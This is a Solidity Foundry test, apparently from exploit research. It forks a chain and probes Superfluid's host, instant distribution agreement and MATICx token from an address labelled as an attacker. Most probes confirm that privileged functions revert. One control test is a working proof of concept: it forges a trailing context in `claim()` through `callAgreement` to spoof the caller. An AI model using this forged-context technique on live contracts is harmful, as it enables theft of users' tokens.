// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {
    function agreementType() external view returns (bytes32);
}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
}

interface IPrivilegedSuperToken is ISuperToken {
    function upgradeByETH() external payable;
    function selfMint(address account, uint256 amount, bytes calldata userData) external;
    function selfBurn(address account, uint256 amount, bytes calldata userData) external;
    function operatorSend(
        address sender,
        address recipient,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external;
    function operationTransferFrom(address account, address spender, address recipient, uint256 amount) external;
    function settleBalance(address account, int256 delta) external;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function mapAgreementClasses(uint256 bitmap) external view returns (address[] memory agreementClasses);
    function isAgreementClassListed(address agreementClass) external view returns (bool yes);
    function registerAgreementClass(ISuperAgreement agreementClassLogic) external;
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function approveSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function revokeSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

contract AgreementRegistrationProbe is ISuperAgreement {
    function agreementType() external pure returns (bytes32) {
        return keccak256("attempt10.fake.agreement");
    }
}

contract UnlistedAgreementCaller is ISuperAgreement {
    function agreementType() external pure returns (bytes32) {
        return keccak256("attempt10.unlisted.agreement");
    }

    function probeSettleBalance(
        IPrivilegedSuperToken token,
        address account,
        int256 delta
    ) external returns (bool ok, bytes memory ret) {
        return address(token).call(abi.encodeCall(token.settleBalance, (account, delta)));
    }
}

/// @title Attempt10
/// @notice Hypothesis: there is no overlooked direct entrypoint outside the
///         already-known `claim()` hole. Deep source reading pointed to four
///         remaining surfaces worth closing explicitly on-chain:
///         1. Host agreement registry: only CFA + IDA are listed, and adding a
///            new agreement class is governance-only.
///         2. The last untested neighboring IDA mutator, `revokeSubscription`,
///            remains Patch-1-gated exactly like approve/delete/update paths.
///         3. SuperToken privileged balance-moving functions are still locked
///            behind `onlySelf`, `onlyHost`, `onlyAgreement`, or operator auth.
///         4. As a control, forged host-trailing `claim()` still succeeds,
///            proving the helper path remains live only for `claim()`.
contract Attempt10 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    address constant CFA = 0x6EeE6060f715257b970700bc2656De21dEdF074C;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant CLAIM_CONTROL_INDEX = 55_100_001;
    uint32 constant REVOKE_DIRECT_INDEX = 55_100_011;
    uint32 constant REVOKE_PLAIN_INDEX = 55_100_012;
    uint32 constant REVOKE_TRAILING_INDEX = 55_100_013;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    IPrivilegedSuperToken constant MATICX = IPrivilegedSuperToken(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(MATICX), "MATICx");
        vm.label(CFA, "CFA");
    }

    function test_last_hidden_surfaces_are_closed() public {
        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);

        _probeAgreementRegistry();
        _probeClaimControl();
        _probeRevokeSubscription();
        _probeSuperTokenPrivilegedSurface();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.logInt(int256(nativeAfter) - int256(nativeBefore));
    }

    function _probeAgreementRegistry() internal {
        address[] memory agreements = HOST.mapAgreementClasses(type(uint256).max);
        console.log("[agreements] listed count:", agreements.length);
        for (uint256 i = 0; i < agreements.length; ++i) {
            console.log("[agreements] listed:", agreements[i]);
        }

        assertEq(agreements.length, 2, "unexpected extra agreement class on host");
        assertEq(agreements[0], CFA, "CFA should remain the first listed agreement");
        assertEq(agreements[1], address(IDA), "IDA should remain the second listed agreement");
        assertTrue(HOST.isAgreementClassListed(CFA), "CFA should be listed");
        assertTrue(HOST.isAgreementClassListed(address(IDA)), "IDA should be listed");

        AgreementRegistrationProbe probe = new AgreementRegistrationProbe();
        vm.label(address(probe), "AgreementRegistrationProbe");

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) =
            address(HOST).call(abi.encodeCall(HOST.registerAgreementClass, (ISuperAgreement(address(probe)))));
        console.log("[registerAgreementClass] ok:", ok);
        console.log("[registerAgreementClass] decoded:", _decodeRevert(ret));
        assertFalse(ok, "attacker should not be able to register a new agreement class");
        assertEq(_decodeRevert(ret), "SF: only governance allowed", "unexpected registerAgreementClass revert");
    }

    function _probeClaimControl() internal {
        _seedClaim(CLAIM_CONTROL_INDEX, ATTACKER);

        bytes memory fakeClaimCtx = _buildContext(ATTACKER, IDA.claim.selector);

        uint256 balanceBefore = MATICX.balanceOf(ATTACKER);
        (,,, uint256 pendingBefore) = IDA.getSubscription(MATICX, ATTACKER, CLAIM_CONTROL_INDEX, ATTACKER);

        vm.prank(ATTACKER);
        (bool ok, bytes memory wrappedRet) = _callAgreementWithTrailingBytes(
            IDA, abi.encodeCall(IDA.claim, (MATICX, ATTACKER, CLAIM_CONTROL_INDEX, ATTACKER, fakeClaimCtx))
        );

        uint256 balanceAfter = MATICX.balanceOf(ATTACKER);
        (,,, uint256 pendingAfter) = IDA.getSubscription(MATICX, ATTACKER, CLAIM_CONTROL_INDEX, ATTACKER);
        bytes memory returnedCtx = _decodeInnerCtx(wrappedRet);
        ContextUtils.Context memory decoded = ContextUtils.decodeContext(returnedCtx);

        console.log("[claim control] ok:", ok);
        console.log("[claim control] token delta:", balanceAfter - balanceBefore);
        console.log("[claim control] pending before:", pendingBefore);
        console.log("[claim control] pending after:", pendingAfter);
        console.log("[claim control] returned msgSender:", decoded.msgSender);

        assertTrue(ok, "forged trailing claim should still be the surviving control path");
        assertEq(balanceAfter - balanceBefore, 1, "claim control should materialize one wei");
        assertEq(pendingBefore, 1, "claim control should start pending");
        assertEq(pendingAfter, 0, "claim control should consume the pending amount");
        assertEq(decoded.msgSender, ATTACKER, "claim should still echo the forged ctx");
    }

    function _probeRevokeSubscription() internal {
        _seedApprovedSubscription(REVOKE_DIRECT_INDEX, KNOWN_USDCX_VICTIM);
        _seedApprovedSubscription(REVOKE_PLAIN_INDEX, KNOWN_USDCX_VICTIM);
        _seedApprovedSubscription(REVOKE_TRAILING_INDEX, KNOWN_USDCX_VICTIM);

        bytes memory forgedCtx = _buildContext(KNOWN_USDCX_VICTIM, IDA.revokeSubscription.selector);

        vm.prank(ATTACKER);
        (bool directOk, bytes memory directRet) = address(IDA).call(
            abi.encodeCall(IDA.revokeSubscription, (MATICX, ATTACKER, REVOKE_DIRECT_INDEX, forgedCtx))
        );
        console.log("[revoke direct] ok:", directOk);
        console.log("[revoke direct] decoded:", _decodeRevert(directRet));
        assertFalse(directOk, "direct revokeSubscription unexpectedly succeeded");
        assertEq(_decodeRevert(directRet), "unauthorized host", "unexpected direct revoke revert");

        vm.prank(KNOWN_USDCX_VICTIM);
        (bool plainOk,) = _callAgreementRaw(
            IDA, abi.encodeCall(IDA.revokeSubscription, (MATICX, ATTACKER, REVOKE_PLAIN_INDEX, new bytes(0)))
        );
        console.log("[revoke host plain] ok:", plainOk);
        assertTrue(plainOk, "plain host revokeSubscription should succeed for real subscriber");

        (bool plainExist, bool plainApproved, uint128 plainUnits,) =
            IDA.getSubscription(MATICX, ATTACKER, REVOKE_PLAIN_INDEX, KNOWN_USDCX_VICTIM);
        console.log("[revoke host plain] exist:", plainExist);
        console.log("[revoke host plain] approved:", plainApproved);
        console.log("[revoke host plain] units:", uint256(plainUnits));
        assertTrue(plainExist, "subscription record should still exist after revoke");
        assertFalse(plainApproved, "plain revoke should clear approval");
        assertEq(plainUnits, 1, "plain revoke should preserve units");

        vm.prank(ATTACKER);
        (bool trailingOk, bytes memory trailingRet) = _callAgreementWithTrailingBytes(
            IDA, abi.encodeCall(IDA.revokeSubscription, (MATICX, ATTACKER, REVOKE_TRAILING_INDEX, forgedCtx))
        );
        console.log("[revoke host trailing] ok:", trailingOk);
        console.log("[revoke host trailing] decoded:", _decodeRevert(trailingRet));
        assertFalse(trailingOk, "trailing forged revokeSubscription unexpectedly succeeded");
        assertEq(_decodeRevert(trailingRet), "invalid ctx", "unexpected trailing revoke revert");

        (bool trailingExist, bool trailingApproved, uint128 trailingUnits,) =
            IDA.getSubscription(MATICX, ATTACKER, REVOKE_TRAILING_INDEX, KNOWN_USDCX_VICTIM);
        assertTrue(trailingExist, "trailing revert should preserve subscription");
        assertTrue(trailingApproved, "trailing revert should preserve approval");
        assertEq(trailingUnits, 1, "trailing revert should preserve units");
    }

    function _probeSuperTokenPrivilegedSurface() internal {
        address sink = makeAddr("sink");
        UnlistedAgreementCaller unlistedAgreement = new UnlistedAgreementCaller();
        vm.label(sink, "Sink");
        vm.label(address(unlistedAgreement), "UnlistedAgreementCaller");

        vm.prank(ATTACKER);
        (bool selfMintOk, bytes memory selfMintRet) =
            address(MATICX).call(abi.encodeCall(MATICX.selfMint, (ATTACKER, 1, new bytes(0))));
        console.log("[superToken selfMint] ok:", selfMintOk);
        console.log("[superToken selfMint] decoded:", _decodeRevert(selfMintRet));
        assertFalse(selfMintOk, "selfMint unexpectedly succeeded");
        assertEq(_decodeRevert(selfMintRet), "SuperToken: only self allowed", "unexpected selfMint revert");

        vm.prank(ATTACKER);
        (bool selfBurnOk, bytes memory selfBurnRet) =
            address(MATICX).call(abi.encodeCall(MATICX.selfBurn, (ATTACKER, 1, new bytes(0))));
        console.log("[superToken selfBurn] ok:", selfBurnOk);
        console.log("[superToken selfBurn] decoded:", _decodeRevert(selfBurnRet));
        assertFalse(selfBurnOk, "selfBurn unexpectedly succeeded");
        assertEq(_decodeRevert(selfBurnRet), "SuperToken: only self allowed", "unexpected selfBurn revert");

        vm.prank(ATTACKER);
        (bool opTransferOk, bytes memory opTransferRet) = address(MATICX).call(
            abi.encodeCall(MATICX.operationTransferFrom, (ATTACKER, ATTACKER, sink, 1))
        );
        console.log("[superToken operationTransferFrom] ok:", opTransferOk);
        console.log("[superToken operationTransferFrom] decoded:", _decodeRevert(opTransferRet));
        assertFalse(opTransferOk, "operationTransferFrom unexpectedly succeeded");
        assertEq(
            _decodeRevert(opTransferRet), "SuperfluidToken: Only host contract allowed", "unexpected operationTransferFrom revert"
        );

        (bool settleOk, bytes memory settleRet) = unlistedAgreement.probeSettleBalance(MATICX, ATTACKER, int256(1));
        console.log("[superToken settleBalance] ok:", settleOk);
        console.log("[superToken settleBalance] decoded:", _decodeRevert(settleRet));
        assertFalse(settleOk, "settleBalance unexpectedly succeeded");
        assertEq(_decodeRevert(settleRet), "SuperfluidToken: only listed agreeement", "unexpected settleBalance revert");

        vm.prank(ATTACKER);
        (bool operatorSendOk, bytes memory operatorSendRet) = address(MATICX).call(
            abi.encodeCall(MATICX.operatorSend, (KNOWN_USDCX_VICTIM, ATTACKER, 1, new bytes(0), new bytes(0)))
        );
        console.log("[superToken operatorSend] ok:", operatorSendOk);
        console.log("[superToken operatorSend] decoded:", _decodeRevert(operatorSendRet));
        assertFalse(operatorSendOk, "operatorSend unexpectedly succeeded");
        assertEq(
            _decodeRevert(operatorSendRet),
            "SuperToken: caller is not an operator for holder",
            "unexpected operatorSend revert"
        );
    }

    function _seedClaim(uint32 indexId, address subscriber) internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 1 wei}();

        vm.startPrank(ATTACKER);
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))), "createIndex");
        _callAgreementOrRevert(
            IDA, abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, subscriber, uint128(1), new bytes(0))), "updateSubscription"
        );
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.updateIndex, (MATICX, indexId, uint128(1), new bytes(0))), "updateIndex");
        vm.stopPrank();
    }

    function _seedApprovedSubscription(uint32 indexId, address subscriber) internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 1 wei}();

        vm.startPrank(ATTACKER);
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))), "createIndex");
        _callAgreementOrRevert(
            IDA, abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, subscriber, uint128(1), new bytes(0))), "updateSubscription"
        );
        vm.stopPrank();

        vm.prank(subscriber);
        _callAgreementOrRevert(
            IDA, abi.encodeCall(IDA.approveSubscription, (MATICX, ATTACKER, indexId, new bytes(0))), "approveSubscription"
        );
    }

    function _buildContext(address fakeMsgSender, bytes4 selector) internal view returns (bytes memory) {
        return ContextUtils.encodeContext(ContextUtils.buildContext(fakeMsgSender, selector, ""));
    }

    function _callAgreementOrRevert(
        ISuperAgreement agreement,
        bytes memory inner,
        string memory step
    ) internal {
        (bool ok, bytes memory ret) = _callAgreementRaw(agreement, inner);
        require(ok, string.concat(step, ": ", _decodeRevert(ret)));
    }

    function _callAgreementRaw(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (agreement, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return _callAgreementRaw(agreement, abi.encodePacked(inner, abi.encode(new bytes(0))));
    }

    function _decodeInnerCtx(bytes memory wrappedReturn) internal pure returns (bytes memory) {
        bytes memory agreementReturn = abi.decode(wrappedReturn, (bytes));
        return agreementReturn.length == 0 ? bytes("") : abi.decode(agreementReturn, (bytes));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
